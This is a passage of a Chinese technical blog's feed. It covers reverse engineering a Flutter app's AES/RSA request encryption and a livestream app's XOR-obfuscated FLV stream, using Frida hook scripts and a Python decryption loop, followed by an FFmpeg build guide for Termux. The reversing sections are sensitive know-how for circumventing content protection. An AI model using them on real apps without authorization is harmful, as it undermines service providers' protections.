srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>IV 是固定的，直接以 base64 的方式存储在 so 中。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_16.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_16.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_17.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_17.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>后面就是 AES 初始化和 解密 操作了，没有密码学上的魔改，参考 frida 部分，不再赘述。</p><h3 id="encryptDataWithR"><a href="#encryptDataWithR" class="headerlink" title="encryptDataWithR"></a>encryptDataWithR</h3><p>使用上面的 AES 解密可以解决抓包中的大部分加密了，但还有两个特殊情况：</p><ol><li>Host&#x2F;Info : 其 post 的 data 是上面的 key 和 iv 加密的</li><li>Host&#x2F;loadMore : 其 post 的 data 无法正确加密，这是本节内容</li></ol><p>既然是加密，那么把所有 <code>*encry*</code> 都打上断点，然后启动调试器，点开一个视频后，下滑，成功断在 <code>encryptDataWithR</code>，如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_01.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_01.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>传入参数是 <code>idid_xxxx</code>。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_02.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_02.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>然后 load 了 Public Key</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_03.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_03.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>然后 parse 转为 Uint8List，以 C7 73 10 开头，后面直接就是 rsa 加密。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_06.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_06.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="源码对照"><a href="#源码对照" class="headerlink" title="源码对照"></a>源码对照</h2><p>通过上面的观察，AES 解密 &#x2F; RSA 加密 应该是调用了外部包，经过一番搜索，是如下两个：</p><ol><li><a href="https://github.com/leocavalcante/encrypt">https://github.com/leocavalcante/encrypt</a></li><li><a href="https://github.com/bcgit/pc-dart">https://github.com/bcgit/pc-dart</a></li></ol><p>比如 RSA 其对应的关键函数：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_04.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_04.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/ida_r_05.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/ida_r_05.png" class="lazyload" data-srcset="/img/2023/KBLive/ida_r_05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>整个过程中最关键的是这三个步骤：</p><ol><li>了解 Object 的结构和 ABI，这样才能在内存中找到需要的内容</li><li>导入函数名至关重要，否则就像无头苍蝇</li><li>适时找到外部包，这将节省巨量时间</li></ol>]]></content>
    
    
    <summary type="html">记录 𝘚 逆向的完整过程：很简单但 Flutter</summary>
    
    
    
    <category term="Android" scheme="https://yzctzl.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://yzctzl.github.io/tags/Android/"/>
    
    <category term="Dart" scheme="https://yzctzl.github.io/tags/Dart/"/>
    
    <category term="Flutter" scheme="https://yzctzl.github.io/tags/Flutter/"/>
    
    <category term="Reverse" scheme="https://yzctzl.github.io/tags/Reverse/"/>
    
    <category term="IDA" scheme="https://yzctzl.github.io/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>实例 F 加密的更新</title>
    <link href="https://yzctzl.github.io/2023/ReNFQ/"/>
    <id>https://yzctzl.github.io/2023/ReNFQ/</id>
    <published>2023-03-30T16:00:00.000Z</published>
    <updated>2023-03-30T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨天很多人 @我 说：F 上新版了，Flutter 写的，还有 Web 端，关键是 ReFLV 中对 F 的解密失效了；于是昨天睡前下了个新版看了下：本来看到 Flutter 心凉了半截，感觉大规模重写可能会作大修改，毕竟上次 F 的加密还是挺麻烦的，结果和老版相比竟总体变化不大，依旧是魔改的 <code>ijkplayer ver.0.8.8 - ffmpeg ver.3.4</code>，鉴于之前已经制作了 Til 文件，预计分析起来会快很多，所以决定搞一下。</p><h2 id="F-的初步分析"><a href="#F-的初步分析" class="headerlink" title="F 的初步分析"></a>F 的初步分析</h2><h3 id="分析-FLV-文件"><a href="#分析-FLV-文件" class="headerlink" title="分析 FLV 文件"></a>分析 FLV 文件</h3><p>Wireshark 抓个 rtmp 链接，或者用 Web 端 IDM 会自动抓到 http-flv 的源，下载一会，打开：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/ReNFQ/2.1.01.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/ReNFQ/2.1.01.png" class="lazyload" data-srcset="/img/2023/ReNFQ/2.1.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>注意到：tag header 部分是完整未修改的，解析的结果也都是正确的；tag data 部分是完全加密的，整个部分完全解析错误了。</p><p>由此可知，解密过程必然在 Demuxer 及之前，因为解复用时如果拿不到完整的 Video&#x2F;Audio Tagheader 必然失败。所以解复用及之前的逻辑是关注的重点，主要是：ijkplayer 中调用 av_read_frame 及其之前。</p><h3 id="导出表中的加密"><a href="#导出表中的加密" class="headerlink" title="导出表中的加密"></a>导出表中的加密</h3><p>根据上次经验，首先尝试 frida-trace 导出表中的各种加密，打开一个直播然后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*decry*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*EVP*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*aes*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*AES*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*DES*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*hmac*&quot;</span></span><br><span class="line">frida-trace -UF -a <span class="string">&quot;libfqffmpeg.so!*RSA*&quot;</span></span><br></pre></td></tr></table></figure><p>毫无结果。</p><h3 id="还在-Demuxer-中吗？"><a href="#还在-Demuxer-中吗？" class="headerlink" title="还在 Demuxer 中吗？"></a>还在 Demuxer 中吗？</h3><p>接下来看看解复用过程中是否存在解密，通过静态和动态分析，发现 Demuxer 时传入的 pb 已经是解密好的 tag data 了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the caller of a native function</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Caller</span>(<span class="params">baseAddr, funAddr, context, fun</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">    fun + <span class="string">&quot; Base address: &quot;</span> + baseAddr + <span class="string">&quot; funAddr: &quot;</span> + funAddr + <span class="string">&quot; ==&gt; &quot;</span> +</span><br><span class="line">      <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get tag data from AVFormatContext</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read_pb_from_AVFC</span>(<span class="params">ptr</span>) &#123;</span><br><span class="line">  <span class="comment">// start is NativePointer of tag data</span></span><br><span class="line">  <span class="keyword">let</span> start = ptr.<span class="title function_">add</span>(<span class="number">0x10</span>).<span class="title function_">readPointer</span>().<span class="title function_">add</span>(<span class="number">0x04</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">  <span class="keyword">let</span> datasize = (start.<span class="title function_">add</span>(<span class="number">1</span>).<span class="title function_">readU8</span>() &lt;&lt; <span class="number">16</span>) </span><br><span class="line">                + (start.<span class="title function_">add</span>(<span class="number">2</span>).<span class="title function_">readU8</span>() &lt;&lt; <span class="number">8</span>) </span><br><span class="line">                + start.<span class="title function_">add</span>(<span class="number">3</span>).<span class="title function_">readU8</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">    <span class="title function_">hexdump</span>(start, &#123;<span class="attr">length</span>: datasize + <span class="number">11</span>, <span class="attr">header</span>: <span class="literal">false</span>&#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookfqff</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> baseAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfqffmpeg.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////// Demuxer 获取到的是 解密 之后的明文</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// flv_read_packet</span></span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(baseAddr.<span class="title function_">add</span>(<span class="number">0x1fda15</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="title class_">Caller</span>(baseAddr, baseAddr.<span class="title function_">add</span>(<span class="number">0x1fda15</span>), <span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;flv_read_packet&quot;</span>)</span><br><span class="line">      <span class="title function_">read_pb_from_AVFC</span>(args[<span class="number">0</span>])</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ff_read_packet</span></span><br><span class="line">  <span class="keyword">let</span> ff_read_packet_ptr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfqffmpeg.so&quot;</span>, <span class="string">&quot;ff_read_packet&quot;</span>)</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(ff_read_packet_ptr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="title class_">Caller</span>(baseAddr, ff_read_packet_ptr, <span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;ff_read_packet&quot;</span>)</span><br><span class="line">      <span class="title function_">read_pb_from_AVFC</span>(args[<span class="number">0</span>])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// read_frame_internal</span></span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(baseAddr.<span class="title function_">add</span>(<span class="number">0x235039</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="title class_">Caller</span>(baseAddr, baseAddr.<span class="title function_">add</span>(<span class="number">0x235039</span>), <span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;read_frame_internal&quot;</span>)</span><br><span class="line">      <span class="title function_">read_pb_from_AVFC</span>(args[<span class="number">0</span>])</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// av_read_frame</span></span><br><span class="line">  <span class="keyword">let</span> av_read_frame_ptr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfqffmpeg.so&quot;</span>, <span class="string">&quot;av_read_frame&quot;</span>)</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(av_read_frame_ptr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="title class_">Caller</span>(baseAddr, av_read_frame_ptr, <span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&quot;av_read_frame&quot;</span>)</span><br><span class="line">      <span class="title function_">read_pb_from_AVFC</span>(args[<span class="number">0</span>])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">hookfqff</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对照源码，经过细致的静态分析，发现确实不存在魔改。基于此，其解密过程并不在解复用过程中。</p><p>那接下来，怀疑的目标有两个，分别是 <code>avformat_open_input</code> 和 <code>read_thread</code> 中 <code>avformat_open_input</code> 到 <code>av_read_frame</code> 之间的部分；因第二部分在 ffplayer 中，先来看第一部分，其在 ffmpeg 中，分析起来更方便，这部分主要是看 rtmp 协议在 FFmpeg 中的调用流程。</p><h2 id="RTMP-Protocol"><a href="#RTMP-Protocol" class="headerlink" title="RTMP Protocol"></a>RTMP Protocol</h2><p>不废话了，直接上调用图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/ReNFQ/2.2.01.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/ReNFQ/2.2.01.png" class="lazyload" data-srcset="/img/2023/ReNFQ/2.2.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>黄色虚线框之外的部分，都处于 rtmp 协议中 packet 读取之前，包括 handshark 和 connect 等过程，黄色框中才是循环读取 rtmp 流中的 packet，所以框外的部分必然无法做手脚，否则协议变更 rtmpdump 不会下载成功，框内部分需要细心查找，很快发现关键位置，在 <code>get_packet</code> 中：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/ReNFQ/2.2.02.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/ReNFQ/2.2.02.png" class="lazyload" data-srcset="/img/2023/ReNFQ/2.2.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>最终只是一个简单的异或罢了。</p><p>想来也合理，如果不加密，很容易被 CDN 拦截，用户抓取也很方便，但原版那种复杂的双端分别加解密，会使直播延迟时间大幅增长，这种简单的在读取 packet 时做异或才是真的经济实惠的方式。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> self.TAGheader.tagtype == <span class="number">9</span>:</span><br><span class="line">    self.parse_video_header()</span><br><span class="line">    <span class="keyword">if</span> self.VideoTAGheader.codecid == <span class="number">7</span> <span class="keyword">or</span> self.VideoTAGheader.codecid == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span>  self.VideoTAGheader.codecid == <span class="number">8</span> <span class="keyword">or</span> self.VideoTAGheader.codecid == <span class="number">13</span>:</span><br><span class="line">        dec_data = <span class="built_in">bytearray</span>(self.TAG.data)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, self.TAGheader.datasize):</span><br><span class="line">            dec_data[i] = dec_data[i] ^ dec_data[i - <span class="number">1</span>]</span><br><span class="line">        dec_data[<span class="number">0</span>] = self.TAG.data[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">        dec_data[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        self.TAG.data = dec_data</span><br><span class="line">        logging.debug(<span class="string">f&quot;Tag <span class="subst">&#123;self.serial&#125;</span>: has been processed <span class="subst">&#123;self.TAGheader.datasize&#125;</span>bytes!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.fatal(<span class="string">f&#x27;UNKNOWN CODECID: <span class="subst">&#123;self.VideoTAGheader.codecid&#125;</span> at <span class="subst">&#123;self.serial&#125;</span>th packet\n&#x27;</span></span><br><span class="line">                        <span class="string">f&#x27;<span class="subst">&#123;hexdump(self.TAG.data, result=<span class="string">&quot;return&quot;</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">    self.reset_timestamp(self.VideoTAGheader.frametype == <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="rtmpdump"><a href="#rtmpdump" class="headerlink" title="rtmpdump"></a>rtmpdump</h3><p>rtmpdump 下载 rtmp 时由于某些不可知原因，会自动在 FLV header 之后添加一个可删除的 Metadata，这将导致 split 失败，可以避免使用 rtmpdump 或者去除代码中的 split 逻辑。</p>]]></content>
    
    
    <summary type="html">对 F 中最新的加密做分析与还原</summary>
    
    
    
    <category term="AV" scheme="https://yzctzl.github.io/categories/AV/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="FFmpeg" scheme="https://yzctzl.github.io/tags/FFmpeg/"/>
    
    <category term="Live" scheme="https://yzctzl.github.io/tags/Live/"/>
    
    <category term="FLV" scheme="https://yzctzl.github.io/tags/FLV/"/>
    
  </entry>
  
  <entry>
    <title>为 Termux 编译扩展的 FFmpeg</title>
    <link href="https://yzctzl.github.io/2023/Termux_FFmpeg/"/>
    <id>https://yzctzl.github.io/2023/Termux_FFmpeg/</id>
    <published>2023-03-23T16:00:00.000Z</published>
    <updated>2023-03-23T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>Termux 编译首先需要准备好环境，这里直接使用官网的 docker。</p><p>首先在 Kali 中安装 Docker: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y docker.io</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker --now</span><br><span class="line"></span><br><span class="line"><span class="comment"># add kali to sudo docker group</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Installing docker-ce</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s\n&#x27;</span> <span class="string">&quot;deb https://download.docker.com/linux/debian bullseye stable&quot;</span> |</span><br><span class="line">  sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker-ce.list</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg |</span><br><span class="line">  sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>然后下载 Docker 镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/termux/termux-packages</span><br><span class="line"><span class="built_in">cd</span> termux-packages</span><br><span class="line"></span><br><span class="line"><span class="comment"># setup Docker</span></span><br><span class="line">./scripts/run-docker.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># update Docker</span></span><br><span class="line">./scripts/update-docker.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># enter</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 085d /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># install vim</span></span><br><span class="line">sudo -s</span><br><span class="line">apt install vim</span><br></pre></td></tr></table></figure><h3 id="修改-FFmpeg"><a href="#修改-FFmpeg" class="headerlink" title="修改 FFmpeg"></a>修改 FFmpeg</h3><p>为了在 FFmpeg 中添加 FLV 对 HEVC、AV1 和 Opus 的支持，先来修改一下源码：<br><a href="https://gist.github.com/yzctzl/c51bdb1b186bbc050f93d811f192597b">ffmpeg_6.0_flv_extend.patch</a><br>可以直接放在 packages&#x2F;ffmpeg 中便会自动应用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;https://gist.github.com/yzctzl/c51bdb1b186bbc050f93d811f192597b/raw/0b35bfc45cebfb762e55f52a6543bbeb0ba0d585/ffmpeg_6.0_flv_extend.patch&quot;</span> -O packages/ffmpeg/flv_extend.patch</span><br></pre></td></tr></table></figure><p>Termux 默认编译脚本中开启了众多编解码器，所以很容易报错，大多移除即可：</p><ol><li><code>vim packages/ffmpeg/build.sh</code></li><li>报错：找不到 sdl&#x2F;sdl-config，移除 libtheora</li><li>报错：libz.so 架构不兼容，移除：librav1e</li></ol><h3 id="编译-FFmpeg"><a href="#编译-FFmpeg" class="headerlink" title="编译 FFmpeg"></a>编译 FFmpeg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-package.sh -a aarch64 ffmpeg</span><br></pre></td></tr></table></figure><p>在编译过程中会自动下载需要包，下面是漫长的等待，在 4C6G 虚拟机中编译了 1~2h。</p><p>特别注意：遇到某些包下载失败，首先检查一下其是否存在，必要时要手动更新一下编译脚本。</p><h3 id="安装-deb-包"><a href="#安装-deb-包" class="headerlink" title="安装 deb 包"></a>安装 deb 包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkg install openssh-tool</span><br><span class="line"><span class="comment"># 推荐 pkg 安装，记得加 路径</span></span><br><span class="line">pkg install ./ffmpeg_6.0-1_aarch64.deb</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">基本按照 https://github.com/termux/termux-packages/wiki 流程来编译</summary>
    
    
    
    <category term="AV" scheme="https://yzctzl.github.io/categories/AV/"/>
    
    
    <category term="AV" scheme="https://yzctzl.github.io/tags/AV/"/>
    
    <category term="FFmpeg" scheme="https://yzctzl.github.io/tags/FFmpeg/"/>
    
    <category term="Live" scheme="https://yzctzl.github.io/tags/Live/"/>
    
    <category term="FLV" scheme="https://yzctzl.github.io/tags/FLV/"/>
    
    <category term="Termux" scheme="https://yzctzl.github.io/tags/Termux/"/>
    
  </entry>
  
  <entry>
    <title>360 T7 刷 OpenWRT 小记</title>
    <link href="https://yzctzl.github.io/2023/360t7/"/>
    <id>https://yzctzl.github.io/2023/360t7/</id>
    <published>2023-02-18T16:00:00.000Z</published>
    <updated>2023-02-18T16:00:00.000Z</updated>
    
